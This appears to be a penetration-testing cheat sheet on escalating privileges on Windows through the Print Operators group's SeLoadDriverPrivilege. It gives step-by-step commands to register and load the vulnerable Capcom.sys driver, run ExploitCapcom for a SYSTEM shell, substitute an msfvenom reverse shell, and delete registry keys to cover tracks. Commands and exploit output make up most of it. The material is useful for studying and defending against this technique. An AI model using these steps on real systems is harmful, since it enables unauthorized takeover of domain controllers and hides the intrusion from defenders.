explorerePrint Operators is a highly privileged group, granting its members SeLoadDriverPrivilege and the ability to log in and reboot a Domain Controller.

With this privilege, we can load a vulnerable driver and exploit it to get System access. 

> This has been patched since __Windows 10 Version 1803__ <br>
It is no longer possible to include references to registry keys under HKEY_CURRENT_USER



## Bypass UAC
If we do not see SeLoadDriverPrivilege, we need to bypass UAC or simply start the shell as Administrator.

// TODO

## Enable the privilege and load the vulnerable driver
If we need to enable the privilege we can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) which will enable the SeLoadDriverPrivilege and load the Capcom.sys driver into the kernel.

First, you might need to edit the includes as such :
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
Then compile it on the target using [cl.exe](https://learn.microsoft.com/en-us/cpp/build/reference/compiler-command-line-syntax?view=msvc-170) : 
```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
Next, download the vulnerable Capcom.sys driver [from here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) and edit the registry to reference the vulnerable driver like this : 
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\temp\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```


Verify the driver is not loaded using [driverview.exe](https://www.nirsoft.net/utils/driverview.html) :
```ps1
.\DriverView.exe /stext drivers.txt
Select-String -Path .\drivers.txt -Pattern Capcom
```
Then you can run the binary : 
```ps1
.\EnableSeLoadDriverPrivilege.exe
```
Now if you run DriverView.exe again, you should see the driver : 
```
.\DriverView.exe /stext drivers.txt
Select-String -Path .\drivers.txt -Pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\temp\Capcom.sys
```

## Exploit the vulnerable driver 

Now that the vulnerable driver is loaded in the kernel, we can exploit it using [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) after compiling it using Visual Studio.
After running the executable, it should open a cmd windows as NT AUTHORITY/SYSTEM : 
```ps1
PS C:\temp> .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
``` 

### Alternative exploitation : No GUI

If we have no GUI access to the target, we should modify the exploit and replace this line :
```C
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
```
with a path to our own binary, like a reverse shell created using msfvenom for example.

## Automating the steps

We can use a tool like [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the first steps of enabling the privilege and loading the driver in the kernel like so : 
```bat
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\temp\Capcom.sys
```
Then run `ExploitCapcom.exe` normally.

## Clean-up

We can cover our tracks by deleting the registry key we created earlier :
```bat
reg delete HKCU\System\CurrentControlSet\Capcom
```